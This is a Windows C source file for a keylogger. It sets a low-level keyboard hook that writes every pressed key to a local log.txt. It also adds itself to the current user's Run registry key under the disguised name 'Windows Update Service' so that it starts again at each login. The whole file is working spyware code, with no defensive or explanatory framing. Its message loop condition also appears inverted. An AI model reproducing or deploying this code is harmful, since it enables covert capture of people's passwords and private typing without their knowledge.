#include <windows.h>
#include <stdio.h>

#define logfile "log.txt"

HHOOK hHock = NULL;

LRESULT CALLBACK low_level_keyhook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {

        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);

        // get key code
        unsigned long tmpScanCode = 1;
        tmpScanCode += hooked.scanCode << 16;
        tmpScanCode += hooked.flags << 24;

        // change code to char name
        char charName[MAX_PATH] = {0};
        charName[0] = '[';
        int i = GetKeyNameText(tmpScanCode , (charName+1), 255) +1; // +1 to add brackets to the name
        charName[i] = ']';

        // write to file
        FILE *file;
        file=fopen(logfile,"a+");
        fputs(charName,file);
        fflush(file);
    }

    return CallNextHookEx(hHock, nCode, wParam, lParam);
}

int register_at_startup()
{
    long result;
    HKEY key;

    // open the location
    result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ|KEY_WRITE|KEY_QUERY_VALUE, &key);
    if (result != ERROR_SUCCESS) return 1;

    // get current file directory
    char file_path[MAX_PATH];
    GetModuleFileName(NULL, file_path, MAX_PATH);

    // register the values
    LPCTSTR data = file_path;
    result = RegSetValueEx(key, "Windows Update Service", 0, REG_SZ, (LPBYTE)data, strlen(data)+1);
    if (result != ERROR_SUCCESS) return 1;

    RegCloseKey(key);
    return 0;
}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
{
    HWND hwnd;
    MSG msg;

    register_at_startup();

    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, low_level_keyhook, NULL, 0);

    while(!GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHock);

    return 0;
}
